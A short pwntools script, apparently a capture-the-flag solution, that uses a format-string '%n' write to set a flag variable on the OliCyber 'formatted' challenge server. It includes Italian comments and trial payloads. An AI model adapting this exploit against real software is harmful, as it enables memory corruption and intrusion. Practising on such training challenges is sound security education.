from pwn import *
from math import ceil
# print flag  0000000000401244
context.arch = 'amd64'


target_value = 0x1 # != 0x0
target = 0x40404c # flag variable


#p = process('./olicyber/pwn/formatted')
p = remote('formatted.challs.olicyber.it', 10305)

towrite = p64(target, endianness='little')
# toset = p64(target_value)
#lower = toset[4:]
#higher = toset[:4]
#print(higher, lower)
# higher è tutto 0x0

# offset f7fa0b23fbad208bf7e9b99200
#        f7fa0b23fbad208bf7e9b99200AAA%7$lpADDRESSS
#        1       2       3       5 6       7
# i byte vuoti vengono saltati, contano come parametro a sé
offset = 13
lenmywrite = len(towrite)

# mi basta scrivere anche solo 1 bit nel target

# %2c%3$nL@@\x00\x00\x00\x00\x00
# %21$nADDRESS

# %1c%15$caaaabaABCDEFGH
# %1c%16$xaaaabaABCDEFGH
# %1cNNNNNNNaaaabaAAAAAAAA%15$p
# 123456
# 12345678%6$lpB
# 12345678%5$x12AAAAAAAA
# A%7$xAAABBBB
# A%7$lnAAADDRESS
# AAAABBBBCCCC %7$p
# AAA%7$lp

print(p.recvuntil(b'name?\n').decode())
#print(payload)
#payload = fmtstr_payload(13, {target: target_value}, write_size='int')
payload = b'AAA%7$ln' + towrite
print(payload)
p.sendline(payload)
#gdb.attach(p)
print(p.recvall().decode())